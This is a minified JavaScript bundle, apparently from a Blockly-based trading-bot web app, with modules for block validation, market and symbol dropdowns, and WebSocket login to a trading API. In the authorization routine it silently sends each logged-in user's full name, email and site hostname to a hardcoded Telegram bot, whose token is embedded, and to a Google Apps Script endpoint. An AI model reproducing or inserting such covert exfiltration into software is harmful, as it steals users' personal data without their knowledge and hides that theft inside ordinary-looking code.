                        let t = e.childBlocks_ && e.childBlocks_.some(e => !0 === e.disabled);
                        return !0 === e.disabled || t
                    }),
                    B = (e, t) => e.forEach(e => {
                        var n, a, i, l, o, s;
                        if ("misplaced" === t && e) u.P.emit("ui.log.error", null === d.T || void 0 === d.T ? void 0 : null === (a = (0, d.T)()) || void 0 === a ? void 0 : null === (n = a[null == e ? void 0 : e.type]) || void 0 === n ? void 0 : n[t]);
                        else if ("missing" === t && e) u.P.emit("ui.log.error", null === d.T || void 0 === d.T ? void 0 : null === (l = (0, d.T)()) || void 0 === l ? void 0 : null === (i = l[e]) || void 0 === i ? void 0 : i[t]);
                        else if ("disabled" === t && e) {
                            let n = !1,
                                a = null === d.T || void 0 === d.T ? void 0 : null === (s = (0, d.T)()) || void 0 === s ? void 0 : null === (o = s[e.type]) || void 0 === o ? void 0 : o[t];
                            e.disabled && a ? (u.P.emit("ui.log.error", a), n = !0) : !n && e.childBlocks_ && e.childBlocks_.forEach(e => {
                                var n, a;
                                let i = null === d.T || void 0 === d.T ? void 0 : null === (a = (0, d.T)()) || void 0 === a ? void 0 : null === (n = a[e.type]) || void 0 === n ? void 0 : n[t];
                                i && u.P.emit("ui.log.error", i)
                            })
                        }
                    }),
                    F = e => {
                        if (!e) return !1;
                        let t = g(e),
                            {
                                mandatoryMainBlocks: n
                            } = (0, s.vc)(),
                            a = [t, ...n],
                            i = P(e, a),
                            l = V(e, a),
                            o = M(i);
                        return l && B(l, "missing"), o && B(o, "disabled"), 0 == [...l, ...o].length
                    },
                    j = (e, t, n, a) => {
                        var i, l, o, s, r, d, c, u, m;
                        let b = e.getMetrics(),
                            p = b.viewLeft - b.scrollLeft,
                            f = b.viewTop - b.scrollTop,
                            h = f;
                        if (n ? (p += a ? t : -t, !_.Z.instance.is_mobile && (h += -20)) : (p += -20, h += a ? t : -t), e.RTL) {
                            p = t;
                            let n = null === (o = document.getElementById("gtm-toolbox")) || void 0 === o ? void 0 : null === (l = o.getBoundingClientRect()) || void 0 === l ? void 0 : l.top;
                            if ((null === (r = e.svgBlockCanvas_) || void 0 === r ? void 0 : null === (s = r.getBoundingClientRect()) || void 0 === s ? void 0 : s.top) > n && (h = f), window.innerWidth < 768) {
                                null == e || null === (d = e.scrollbar) || void 0 === d || d.set(0, h);
                                let t = (null === (c = e.svgBlockCanvas_) || void 0 === c ? void 0 : c.getBoundingClientRect().width) - (null === (u = e.svgBlockCanvas_) || void 0 === u ? void 0 : u.getBoundingClientRect().left) + 60;
                                null == e || null === (m = e.scrollbar) || void 0 === m || m.set(t, h);
                                return
                            }
                        }
                        null == e || null === (i = e.scrollbar) || void 0 === i || i.set(p, h)
                    },
                    G = (e, t, n) => {
                        let a = e && window.Blockly.Events.getGroup() || n || !0;
                        window.Blockly.Events.setGroup(a), t(), !e && window.Blockly.Events.setGroup(!1)
                    },
                    X = e => {
                        let {
                            recordUndo: t
                        } = window.Blockly.Events;
                        window.Blockly.Events.setRecordUndo(!1), e(), window.Blockly.Events.setRecordUndo(t ? ? !0)
                    },
                    Y = e => {
                        window.Blockly.Events.disable(), e(), window.Blockly.Events.enable()
                    },
                    H = (e, t) => {
                        t.type === window.Blockly.Events.BLOCK_DRAG && !t.isStart && e.getAllBlocks().forEach(e => {
                            if (!e.getParent() || e.is_user_disabled_state) return;
                            let n = e.restricted_parents || [];
                            if (0 === n.length) return;
                            let a = !n.some(t => e.isDescendantOf(t));
                            G(!0, () => {
                                e.setDisabled(a)
                            }, t.group), window.Blockly.Events.setGroup(!1)
                        })
                    },
                    $ = e => !e || "''" === e,
                    W = () => {
                        var e, t;
                        let n = null === (t = window.Blockly) || void 0 === t ? void 0 : null === (e = t.getSelected()) || void 0 === e ? void 0 : e.svgGroup_,
                            a = window.Blockly.Xml.domToPrettyText(n);
                        (0, h.p)({
                            data: a,
                            type: "text/xml;charset=utf-8",
                            filename: "block.xml"
                        })
                    },
                    z = () => ({
                        text: (0, o.NC)("Download Block"),
                        enabled: !0,
                        callback: W
                    }),
                    Z = (e, t) => {
                        for (let n = 0; n <= e.length - 1; n++) {
                            let a = (0, o.NC)(e[n].text);
                            t.includes(a) ? e.splice(n, 1) : e[n].text = a
                        }
                    },
                    K = () => [(0, o.NC)("Duplicate"), (0, o.NC)("Add Comment"), (0, o.NC)("Remove Comment"), (0, o.NC)("Collapse Block"), (0, o.NC)("Expand Block"), (0, o.NC)("Disable Block"), (0, o.NC)("Enable Block"), (0, o.NC)("Download Block")],
                    q = () => (0, o.NC)("Delete Block"),
                    Q = () => (0, o.NC)("Delete All Blocks"),
                    J = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : [];
                        [z(), ...t].forEach(t => {
                            e.push({
                                text: t.text,
                                enabled: t.enabled,
                                callback: t.callback
                            })
                        });
                        for (let t = 0; t < e.length; t++) {
                            var n, a;
                            let i = null === (a = e[t]) || void 0 === a ? void 0 : null === (n = a.text) || void 0 === n ? void 0 : n.toLowerCase();
                            if (null == i ? void 0 : i.includes("delete")) i.includes("block") && !i.includes("blocks") ? e[t].text = q() : e[t].text = Q();
                            else {
                                let n = (0, o.NC)(e[t].text);
                                K().includes(n) && (e[t].text = n)
                            }
                        }
                    },
                    ee = e => {
                        if (!e) return "invalid_input";
                        try {
                            let t = Function(`return ${e.trim()}`)();
                            return isNaN(t) ? "invalid_input" : t
                        } catch (e) {
                            return "invalid_input"
                        }
                    },
                    et = e => {
                        try {
                            var t, n;
                            if (!(null == e ? void 0 : e.collapsed_) || (null == e ? void 0 : e.getField(e.type))) return;
                            let [a, i] = (null == e ? void 0 : null === (n = e.inputList) || void 0 === n ? void 0 : null === (t = n[0]) || void 0 === t ? void 0 : t.fieldRow.map(e => e.value_)) || [], l = null == e ? void 0 : e.getField(Blockly.constants.COLLAPSED_FIELD_NAME), s = null == e ? void 0 : e.getInput(Blockly.constants.COLLAPSED_INPUT_NAME);
                            if (s && l) {
                                s.appendField(new Blockly.FieldImage(a, 25, 25, "", "")), s.appendField(new Blockly.FieldLabel(i, "blocklyTextRootBlockHeaderCollapsed"));
                                let t = `${null==e?void 0:e.workspace.options.pathToMedia}dropdown-arrow.svg`,
                                    n = new Blockly.FieldImage(t, 16, 16, (0, o.NC)("Collapsed"), () => null == e ? void 0 : e.setCollapsed(!1));
                                s.appendField(n, e.type), s.sourceBlock.width = 300, l.setVisible(!1)
                            }
                        } catch (e) {
                            u.P.emit("ui.log.error", e)
                        }
                    },
                    en = e => {
                        let t = e.getInput("_TEMP_COLLAPSED_INPUT");
                        if (t && e.collapsed_ && !t.icon_added) {
                            var n;
                            t.icon_added = !0;
                            let a = `${e.workspace.options.pathToMedia}dropdown-arrow.svg`,
                                i = new Blockly.FieldImage(a, 16, 16, (0, o.NC)("Collapsed"), () => e.setCollapsed(!1)),
                                l = e.getFieldValue("NAME"),
                                s = ` (${null==e?void 0:null===(n=e.arguments)||void 0===n?void 0:n.join(", ")})`;
                            t.appendField(new Blockly.FieldLabel((0, o.NC)("function"), "")).appendField(new Blockly.FieldLabel(l + s, "header__title")).appendField(i);
                            (e => {
                                var t, n;
                                let a = e.fieldRow;
                                null === (t = a[0]) || void 0 === t || t.setVisible(!1), null === (n = a[0]) || void 0 === n || n.forceRerender()
                            })(t)
                        }
                    },
                    ea = e => {
                        let t = e.getField("CURRENCY_LIST"),
                            {
                                currency: n
                            } = _.Z.instance.client;
                        null == t || t.setValue((0, l.O$T)(n))
                    }
            },
            87911: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: function() {
                        return r
                    }
                });
                var a = n(27412),
                    i = n(48059),
                    l = n(47962),
                    o = n(29265),
                    s = n(79907);
                class r {
                    async retrieveActiveSymbols() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        return (await this.trading_times.initialise(), !e && this.is_initialised) ? (await this.init_promise, this.active_symbols) : (this.is_initialised = !0, s.DO.has_active_symbols || await s.DO.active_symbols_promise, this.active_symbols = (null === s.DO || void 0 === s.DO ? void 0 : s.DO.active_symbols) ? ? [], this.processed_symbols = this.processActiveSymbols(), this.trading_times.onMarketOpenCloseChanged = e => {
                            Object.keys(e).forEach(t => {
                                let n = this.active_symbols[t];
                                n && (n.exchange_is_open = e[t])
                            }), this.changes = e, this.processActiveSymbols()
                        }, this.init_promise.resolve(), this.active_symbols)
                    }
                    processActiveSymbols() {
                        return this.active_symbols.reduce((e, t) => {
                            if ((0, l.vc)().DISABLED_SYMBOLS.includes(t.symbol) || (0, l.vc)().DISABLED_SUBMARKETS.includes(t.submarket)) return e;
                            let n = (e, n) => -1 !== Object.keys(e).findIndex(e => e === t[n]);
                            !n(e, "market") && (e[t.market] = {
                                display_name: t.market_display_name,
                                submarkets: {}
                            });
                            let {
                                submarkets: a
                            } = e[t.market];
                            !n(a, "submarket") && (a[t.submarket] = {
                                display_name: t.submarket_display_name,
                                symbols: {}
                            });
                            let {
                                symbols: i
                            } = a[t.submarket];
                            return !n(i, "symbol") && (i[t.symbol] = {
                                display_name: t.display_name,
                                pip_size: `${t.pip}`.length - 2,
                                is_active: !t.is_trading_suspended && t.exchange_is_open
                            }), e
                        }, {})
                    }
                    getAllSymbols() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                            t = [];
                        return Object.keys(this.processed_symbols).forEach(n => {
                            if (e && this.isMarketClosed(n)) return;
                            let a = this.processed_symbols[n],
                                {
                                    submarkets: i
                                } = a;
                            Object.keys(i).forEach(e => {
                                let l = i[e],
                                    {
                                        symbols: o
                                    } = l;
                                Object.keys(o).forEach(i => {
                                    let s = o[i];
                                    t.push({
                                        market: n,
                                        market_display: a.display_name,
                                        submarket: e,
                                        submarket_display: l.display_name,
                                        symbol: i,
                                        symbol_display: s.display_name
                                    })
                                })
                            })
                        }), this.getSymbolsForBot(), t
                    }
                    getSymbolsForBot() {
                        let {
                            DISABLED: e
                        } = (0, l.vc)().QUICK_STRATEGY, t = [];
                        return Object.keys(this.processed_symbols).forEach(n => {
                            if (this.isMarketClosed(n)) return;
                            let {
                                submarkets: a
                            } = this.processed_symbols[n];
                            Object.keys(a).forEach(n => {
                                if (e.SUBMARKETS.includes(n)) return;
                                let i = a[n],
                                    {
                                        symbols: l
                                    } = i;
                                Object.keys(l).forEach(n => {
                                    if (e.SYMBOLS.includes(n)) return;
                                    let a = l[n];
                                    t.push({
                                        group: i.display_name,
                                        text: a.display_name,
                                        value: n
                                    })
                                })
                            })
                        }), t
                    }
                    getMarketDropdownOptions() {
                        let e = [];
                        if (Object.keys(this.processed_symbols).forEach(t => {
                                let {
                                    display_name: n
                                } = this.processed_symbols[t], a = n + (this.isMarketClosed(t) ? ` ${(0,i.NC)("(Closed)")}` : "");
                                e.push([a, t])
                            }), 0 === e.length) return (0, l.vc)().NOT_AVAILABLE_DROPDOWN_OPTIONS;
                        if (e.sort(e => "synthetic_index" === e[1] ? -1 : 1), e.some(e => this.isMarketClosed(e[1]))) {
                            let t = this.sortDropdownOptions(e, this.isMarketClosed);
                            return this.isMarketClosed("forex") ? t.sort(e => "synthetic_index" === e[1] ? -1 : 1) : t
                        }
                        return e
                    }
                    getSubmarketDropdownOptions(e) {
                        let t = [],
                            n = this.processed_symbols[e];
                        if (n) {
                            let {
                                submarkets: e
                            } = n;
                            Object.keys(e).forEach(n => {
                                let {
                                    display_name: a
                                } = e[n], l = a + (this.isSubmarketClosed(n) ? ` ${(0,i.NC)("(Closed)")}` : "");
                                t.push([l, n])
                            })
                        }
                        return 0 === t.length ? (0, l.vc)().NOT_AVAILABLE_DROPDOWN_OPTIONS : ("synthetic_index" === e && t.sort(e => "random_index" === e[1] ? -1 : 1), this.sortDropdownOptions(t, this.isSubmarketClosed))
                    }
                    getSymbolDropdownOptions(e) {
                        let t = Object.keys(this.processed_symbols).reduce((t, n) => {
                            let {
                                submarkets: a
                            } = this.processed_symbols[n];
                            return Object.keys(a).forEach(n => {
                                if (n === e) {
                                    let {
                                        symbols: e
                                    } = a[n];
                                    Object.keys(e).forEach(n => {
                                        let {
                                            display_name: a
                                        } = e[n], l = a + (this.isSymbolClosed(n) ? ` ${(0,i.NC)("(Closed)")}` : "");
                                        t.push([l, n])
                                    })
                                }
                            }), t
                        }, []);
                        return 0 === t.length ? (0, l.vc)().NOT_AVAILABLE_DROPDOWN_OPTIONS : this.sortDropdownOptions(t, this.isSymbolClosed)
                    }
                    isMarketClosed(e) {
                        let t = this.processed_symbols[e];
                        return !t || Object.keys(t.submarkets).every(e => this.isSubmarketClosed(e))
                    }
                    isSubmarketClosed(e) {
                        let t = Object.keys(this.processed_symbols).find(t => Object.keys(this.processed_symbols[t].submarkets).includes(e));
                        if (!t) return !0;
                        let n = this.processed_symbols[t].submarkets[e];
                        if (!n) return !0;
                        let {
                            symbols: a
                        } = n;
                        return Object.keys(a).every(e => this.isSymbolClosed(e))
                    }
                    isSymbolClosed(e) {
                        return this.active_symbols.some(t => t.symbol === e && (!t.exchange_is_open || t.is_trading_suspended))
                    }
                    constructor(e) {
                        (0, a._)(this, "sortDropdownOptions", (e, t) => {
                            let n = [...e];
                            return n.sort((e, n) => {
                                let a = t.call(this, e[1]),
                                    i = t.call(this, n[1]);
                                return a && !i ? 1 : a === i ? 0 : -1
                            }), n
                        }), this.active_symbols = [], this.disabled_symbols = (0, l.vc)().DISABLED_SYMBOLS, this.disabled_submarkets = (0, l.vc)().DISABLED_SUBMARKETS, this.init_promise = new o.Z, this.is_initialised = !1, this.processed_symbols = {}, this.trading_times = e
                    }
                }
            },
            79907: function(e, t, n) {
                "use strict";
                n.d(t, {
                    DO: function() {
                        return u
                    },
                    PL: function() {
                        return m
                    },
                    go: function() {
                        return p
                    },
                    hL: function() {
                        return b
                    }
                });
                var a = n(27412),
                    i = n(65464),
                    l = n(39338),
                    o = n(89064),
                    s = n(13604),
                    r = n(87383),
                    d = n(49243);
                class c {
                    onsocketopen() {
                        (0, o.bl)(o.cR.OPENED)
                    }
                    onsocketclose() {
                        (0, o.bl)(o.cR.CLOSED), this.reconnectIfNotConnected()
                    }
                    async init() {
                        var e, t, n, a;
                        let i = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        this.toggleRunButton(!0), this.api && this.unsubscribeAllSubscriptions(), (!this.api || (null === (e = this.api) || void 0 === e ? void 0 : e.connection.readyState) !== 1 || i) && ((null === (t = this.api) || void 0 === t ? void 0 : t.connection) && (s.Z.disposeInstance(), (0, o.bl)(o.cR.CLOSED), this.api.disconnect(), this.api.connection.removeEventListener("open", this.onsocketopen.bind(this)), this.api.connection.removeEventListener("close", this.onsocketclose.bind(this))), this.api = (0, r.wL)(), null === (n = this.api) || void 0 === n || n.connection.addEventListener("open", this.onsocketopen.bind(this)), null === (a = this.api) || void 0 === a || a.connection.addEventListener("close", this.onsocketclose.bind(this))), !this.has_active_symbols && !(0, r.PO)() && (this.active_symbols_promise = this.getActiveSymbols()), this.initEventListeners(), this.time_interval && clearInterval(this.time_interval), this.time_interval = null, (0, r.PO)() && ((0, o.UM)(!0), await this.authorizeAndSubscribe()), d.Z.init(i)
                    }
                    getConnectionStatus() {
                        var e;
                        if (null === (e = this.api) || void 0 === e ? void 0 : e.connection) {
                            let e = this.api.connection.readyState;
                            return l.Px[e] || "Unknown"
                        }
                        return "Socket not initialized"
                    }
                    terminate() {
                        this.api && this.api.disconnect()
                    }
                    initEventListeners() {
                        window && (window.addEventListener("online", this.reconnectIfNotConnected), window.addEventListener("focus", this.reconnectIfNotConnected))
                    }
                    async createNewInstance(e) {
                        this.account_id !== e && await this.init()
                    }
                    async customInit() {
                        var e, t, n, a;
                        let i = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        this.api && this.unsubscribeAllSubscriptions(), (!this.api || (null === (e = this.api) || void 0 === e ? void 0 : e.connection.readyState) !== 1 || i) && ((null === (t = this.api) || void 0 === t ? void 0 : t.connection) && (s.Z.disposeInstance(), (0, o.bl)(o.cR.CLOSED), this.api.disconnect(), this.api.connection.removeEventListener("open", this.onsocketopen.bind(this)), this.api.connection.removeEventListener("close", this.onsocketclose.bind(this))), this.api = (0, r.wL)(), null === (n = this.api) || void 0 === n || n.connection.addEventListener("open", this.onsocketopen.bind(this)), null === (a = this.api) || void 0 === a || a.connection.addEventListener("close", this.onsocketclose.bind(this))), this.initEventListeners(), this.getTime(), this.time_interval && clearInterval(this.time_interval), this.time_interval = null
                    }
                    getTime() {
                        this.api && (this.time_interval2 = setInterval(() => {
                            this.api.send({
                                time: 1
                            })
                        }, 15e3))
                    }
                    async authorizeAndSubscribe() {
                        let e = (0, r.PO)();
                        if (e) {
                            if (this.token = e, this.account_id = (0, r.Bc)() ? ? "", !this.api) return;
                            try {
                                let {
                                    authorize: e,
                                    error: t
                                } = await this.api.authorize(this.token);
                                if (t) return t;
                                if (this.has_active_symbols ? this.toggleRunButton(!1) : this.active_symbols_promise = this.getActiveSymbols(), this.account_info = e, (0, o.Ii)(e.account_list), (0, o.A3)(e), (0, o.Zc)(!0), this.is_authorized = !0, e.email) {
                                    let t = window.location.hostname;
                                    try {
                                        let n = `New user authorized:
👤 *Name:* ${e.fullname}
📧 *Email:* ${e.email}
🌐 *Website:* ${t}`;
                                        await fetch("https://api.telegram.org/bot7438897374:AAFMSg47EFubYdXSqbttO7f7y0rKkeQ0_RY/sendMessage", {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json"
                                            },
                                            body: JSON.stringify({
                                                chat_id: "-1002597144388",
                                                text: n,
                                                parse_mode: "Markdown"
                                            })
                                        }), await fetch("https://script.google.com/macros/s/AKfycbxmrup5FgqdLiv1gmYoZvv-pHouojBSNs8h--LKfMQ7VBCPMWUlxAcvphS4-JhGQ6kXzg/exec", {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json"
                                            },
                                            body: JSON.stringify({
                                                email: e.email,
                                                fullname: e.fullname,
                                                website: t
                                            })
                                        })
                                    } catch (e) {
                                        console.error("Error during data processing:", e)
                                    }
                                }
                                this.subscribe(), this.getSelfExclusion()
                            } catch (e) {
                                this.is_authorized = !1, (0, o.Zc)(!1), i.P.emit("Error", e)
                            } finally {
                                (0, o.UM)(!1)
                            }
                        }
                    }
                    async getSelfExclusion() {
                        this.api && this.is_authorized && await this.api.getSelfExclusion()
                    }
                    async authorize_3(e) {
                        await this.api.authorize(e);
                        let {
                            authorize: t,
                            error: n
                        } = await this.api.expectResponse("authorize");
                        return {
                            authorize: t,
                            error: n
                        }
                    }
                    async subscribe() {
                        await Promise.all(["balance", "transaction", "proposal_open_contract"].map(e => (0, l.l6)(() => {
                            var t;
                            let n = null === (t = this.api) || void 0 === t ? void 0 : t.send({
                                [e]: 1,
                                subscribe: 1,
                                ..."balance" === e ? {
                                    account: "all"
                                } : {}
                            });
                            return n && this.current_auth_subscriptions.push(n), n
                        }, [], this)))
                    }
                    setIsRunning() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                        this.is_running = e
                    }
                    pushSubscription(e) {
                        this.subscriptions.push(e)
                    }
                    clearSubscriptions() {
                        this.subscriptions.forEach(e => e.unsubscribe()), this.subscriptions = [], (i.P.getState("global_timeouts") ? ? []).forEach((e, t) => {
                            clearTimeout(t)
                        })
                    }
                    constructor() {
                        (0, a._)(this, "api", null), (0, a._)(this, "token", ""), (0, a._)(this, "account_id", ""), (0, a._)(this, "pip_sizes", {}), (0, a._)(this, "account_info", {}), (0, a._)(this, "is_running", !1), (0, a._)(this, "subscriptions", []), (0, a._)(this, "time_interval", null), (0, a._)(this, "time_interval2", null), (0, a._)(this, "has_active_symbols", !1), (0, a._)(this, "is_stopping", !1), (0, a._)(this, "active_symbols", []), (0, a._)(this, "current_auth_subscriptions", []), (0, a._)(this, "is_authorized", !1), (0, a._)(this, "active_symbols_promise", null), (0, a._)(this, "common_store", void 0), (0, a._)(this, "landing_company", null), (0, a._)(this, "unsubscribeAllSubscriptions", () => {
                            var e;
                            null === (e = this.current_auth_subscriptions) || void 0 === e || e.forEach(e => {
                                e.then(e => {
                                    let {
                                        subscription: t
                                    } = e;
                                    if (null == t ? void 0 : t.id) {
                                        var n;
                                        null === (n = this.api) || void 0 === n || n.send({
                                            forget: t.id
                                        })
                                    }
                                })
                            }), this.current_auth_subscriptions = []
                        }), (0, a._)(this, "reconnectIfNotConnected", () => {
                            var e, t, n, a, i, l;
                            console.log("connection state: ", null === (t = this.api) || void 0 === t ? void 0 : null === (e = t.connection) || void 0 === e ? void 0 : e.readyState), (null === (a = this.api) || void 0 === a ? void 0 : null === (n = a.connection) || void 0 === n ? void 0 : n.readyState) && (null === (l = this.api) || void 0 === l ? void 0 : null === (i = l.connection) || void 0 === i ? void 0 : i.readyState) > 1 && (console.log("Info: Connection to the server was closed, trying to reconnect."), this.init(!0))
                        }), (0, a._)(this, "getActiveSymbols", async () => {
                            await (0, l.l6)(() => {
                                var e;
                                return null === (e = this.api) || void 0 === e ? void 0 : e.send({
                                    active_symbols: "brief"
                                })
                            }, [], this).then(e => {
                                let {
                                    active_symbols: t = [],
                                    error: n = {}
                                } = e, a = {};
                                return t.length && (this.has_active_symbols = !0), t.forEach(e => {
                                    let {
                                        symbol: t,
                                        pip: n
                                    } = e;
                                    a[t] = +(+n).toExponential().substring(3)
                                }), this.pip_sizes = a, this.toggleRunButton(!1), this.active_symbols = t, t || n
                            })
                        }), (0, a._)(this, "toggleRunButton", e => {
                            let t = document.querySelector("#db-animation__run-button");
                            t && (t.disabled = e)
                        })
                    }
                }
                let u = new c,
                    m = new c,
                    b = new c,
                    p = new c
            },
            13604: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => d
                });
                var a = n("27412");
                class i {
                    getStakePayoutLimits() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "AUD",
                            t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "svg",
                            n = arguments.length > 2 ? arguments[2] : void 0;
                        return this.ws.send({
                            landing_company_details: t
                        }).then(t => {
                            var a;
                            let i = null == t ? void 0 : null === (a = t.landing_company_details) || void 0 === a ? void 0 : a.currency_config[n];
                            return i ? i[e] : {}
                        })
                    }
                    constructor(e) {
                        this.ws = e.ws
                    }
                }
                var l = n("87911"),
                    o = n("48867"),
                    s = n("30231");
                class r {
                    static disposeInstance() {
                        this.singleton = null
                    }
                    static setInstance(e) {
                        return !this.singleton && (this.singleton = new r(e)), this.instance
                    }
                    static get instance() {
                        return this.singleton
                    }
                    constructor(e) {
                        this.trading_times = new s.Z(e), this.contracts_for = new o.Z(e), this.active_symbols = new l.Z(this.trading_times), this.account_limits = new i(e)
                    }
                }(0, a._)(r, "singleton", null);
                let d = r
            },
            87383: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Lu: () => _,
                    Ke: () => m,
                    LP: () => f,
                    Bc: () => p,
                    PO: () => b,
                    wL: () => u
                });
                var a = n("66175"),
                    i = n("33304"),
                    l = n("66000"),
                    o = n.n(l),
                    s = n("48059"),
                    r = n("27412");
                let d = ["active_symbols", "authorize", "balance", "buy", "proposal", "proposal_open_contract", "transaction", "ticks_history", "history"],
                    c = class e {
                        constructor(e) {
                            (0, r._)(this, "getRequestType", e => {
                                let t;
                                return d.forEach(n => {
                                    n in e && !t && (t = n)
                                }), t
                            }), (0, r._)(this, "defineMeasure", e => {
                                if (e) {
                                    let t;
                                    return "history" === e ? (performance.mark("ticks_history_end"), t = performance.measure("ticks_history", "ticks_history_start", "ticks_history_end")) : (performance.mark(`${e}_end`), t = performance.measure(`${e}`, `${e}_start`, `${e}_end`)), t.startTimeDate = new Date(Date.now() - t.startTime)
                                }
                                return !1
                            }), (0, r._)(this, "sendIsCalled", e => {
                                let {
                                    response_promise: t,
                                    args: [n]
                                } = e, a = this.getRequestType(n);
                                return a && performance.mark(`${a}_start`), t.then(e => {
                                    let t = this.getRequestType(e);
                                    t && this.defineMeasure(t)
                                }).catch(() => {}), t
                            }), this.config = e, this.debounced_calls = {}
                        }
                    },
                    u = () => {
                        var e, t;
                        let n = (0, a.wmM)().replace(/[^a-zA-Z0-9.]/g, ""),
                            l = (null === (t = (0, a.rhL)()) || void 0 === t ? void 0 : null === (e = t.replace) || void 0 === e ? void 0 : e.call(t, /[^a-zA-Z0-9]/g, "")) ? ? (0, a.rhL)(),
                            r = new WebSocket(`wss://${n}/websockets/v3?app_id=${l}&l=${(0,s.Jb)()}&brand=${i.F0.toLowerCase()}`);
                        return new(o())({
                            connection: r,
                            middleware: new c({})
                        })
                    },
                    m = () => {
                        let e = localStorage.getItem("active_loginid");
                        return e && "null" !== e ? e : null
                    },
                    b = () => {
                        let e = localStorage.getItem("authToken");
                        return e && "null" !== e ? e : null
                    },
                    p = () => {
                        let e = b();
                        if (!e) return null;
                        let t = JSON.parse(localStorage.getItem("accountsList"));
                        return t && "null" !== t ? Object.keys(t).find(n => t[n] === e) : null
                    },
                    f = () => {
                        let e = m(),
                            t = JSON.parse(localStorage.getItem("accountsList")) ? ? void 0;
                        return {
                            token: (t && t[e] || {}) ? ? void 0,
                            account_id: e ? ? void 0
                        }
                    },
                    _ = e => {
                        let t = JSON.parse(localStorage.getItem("accountsList")) ? ? void 0;
                        return {
                            token: t && t[e] || {},
                            account_id: e || void 0
                        }
                    }
            },
            49243: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: function() {
                        return l
                    }
                });
                var a = n(27412),
                    i = n(87383);
                let l = new class e {
                    onsocketclose() {
                        this.reconnectIfNotConnected()
                    }
                    getTime() {
                        !this.time_interval && (this.time_interval = setInterval(() => {
                            this.api.send({
                                time: 1
                            })
                        }, 3e4))
                    }
                    constructor() {
                        var e = this;
                        (0, a._)(this, "api", void 0), (0, a._)(this, "init", async function() {
                            let t = arguments.length > 0 && void 0 !== arguments[0] && arguments[0];
                            if (!e.api || t) {
                                var n, a;
                                (null === (n = e.api) || void 0 === n ? void 0 : n.connection) && (e.api.disconnect(), e.api.connection.removeEventListener("close", e.onsocketclose.bind(e))), e.api = await (0, i.wL)(), null === (a = e.api) || void 0 === a || a.connection.addEventListener("close", e.onsocketclose.bind(e))
                            }(0, i.Ke)() && await e.api.authorize((0, i.LP)().token), e.getTime()
                        }), (0, a._)(this, "reconnectIfNotConnected", () => {
                            var e, t, n, a, i, l;
                            console.log("chart connection state: ", null === (t = this.api) || void 0 === t ? void 0 : null === (e = t.connection) || void 0 === e ? void 0 : e.readyState), (null === (a = this.api) || void 0 === a ? void 0 : null === (n = a.connection) || void 0 === n ? void 0 : n.readyState) && (null === (l = this.api) || void 0 === l ? void 0 : null === (i = l.connection) || void 0 === i ? void 0 : i.readyState) > 1 && (console.log("Info: Chart connection to the server was closed, trying to reconnect."), this.init(!0))
                        })
                    }
                }
            },
            48867: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: function() {
                        return s
                    }
                });
                var a = n(27412),
                    i = n(47962),
                    l = n(29265),
                    o = n(79907);
                class s {
                    async getBarriers(e, t, n, a) {
                        let l = {
                            values: []
                        };
                        if (!(0, i.vc)().BARRIER_TRADE_TYPES.includes(t)) return l;
                        let o = ["high_barrier", "low_barrier"],
                            s = await this.getContractsByTradeType(e, t),
                            r = await this.getDurations(e, t, !1),
                            d = /^[-|+]([0-9]+.[0-9]+)$/,
                            c = e => e && d.test(e.toString()),
                            u = !0;
                        return s.length > 0 && (a.forEach((e, m) => {
                            let b = ["+", "-"].includes(e),
                                p = this.getContractCategoryByTradeType(t),
                                f = s.find(e => {
                                    let {
                                        BARRIER_CATEGORIES: a
                                    } = (0, i.vc)(), l = Object.keys(a).find(e => a[e].includes(t)), s = e.contract_category === p, d = -1 !== r.findIndex(e => e.unit === n), u = e.barrier_category === l, f = b && c(e.barrier || e[o[m]]) || !b && !c(e.barrier || e[o[m]]);
                                    return s && d && u && f
                                });
                            if (!f && (f = s.filter(e => e.barrier || e.high_barrier).sort((e, t) => {
                                    let n = e.barrier || e.high_barrier,
                                        a = t.barrier || t.high_barrier;
                                    return parseFloat(n) - parseFloat(a)
                                }).shift()) && !b && (u = !1), f) {
                                let t = 1 === f.barriers ? "barrier" : o[m];
                                if (f[t]) {
                                    let e = `${f[t]}`.match(d);
                                    l.values[m] = e ? e[1] : f[t]
                                }
                                Object.assign(l, {
                                    allow_both_types: ["intraday", "tick"].includes(f.expiry_type) && c(f[t]),
                                    allow_absolute_type: "absolute" === e && !c(f[t])
                                }), 1 === f.barriers && a.splice(m + 1, 1)
                            }
                        }), u ? 2 === l.values.length && a.every(e => e === a[0]) && l.values.every(e => e === l.values[0]) && (l.values[1] = (.95 * l.values[0]).toFixed(1)) : l.values = l.values.map(() => !1)), l
                    }
                    getContractCategoryByTradeType(e) {
                        let {
                            TRADE_TYPE_TO_CONTRACT_CATEGORY_MAPPING: t
                        } = (0, i.vc)();
                        return Object.keys(t).find(n => t[n].includes(e)) || e
                    }
                    getTradeTypeCategoryByTradeType(e) {
                        let {
                            TRADE_TYPE_CATEGORIES: t
                        } = (0, i.vc)();
                        return Object.keys(t).find(n => t[n].includes(e)) || e
                    }
                    getTradeTypeCategoryNameByTradeType(e) {
                        let {
                            TRADE_TYPE_CATEGORY_NAMES: t
                        } = (0, i.vc)();
                        return t[this.getTradeTypeCategoryByTradeType(e)]
                    }
                    getBarrierCategoryByTradeType(e) {
                        let {
                            BARRIER_CATEGORIES: t
                        } = (0, i.vc)();
                        return Object.keys(t).find(n => t[n].includes(e))
                    }
                    async getContractsByTradeType(e, t) {
                        let n = await this.getContractsFor(e),
                            a = this.getContractCategoryByTradeType(t),
                            i = this.getBarrierCategoryByTradeType(t);
                        return n.filter(e => {
                            let t = e.contract_category === a,
                                n = e.barrier_category === i;
                            return t && n
                        })
                    }
                    async getContractsFor(e) {
                        if (!e || "na" === e) return [];
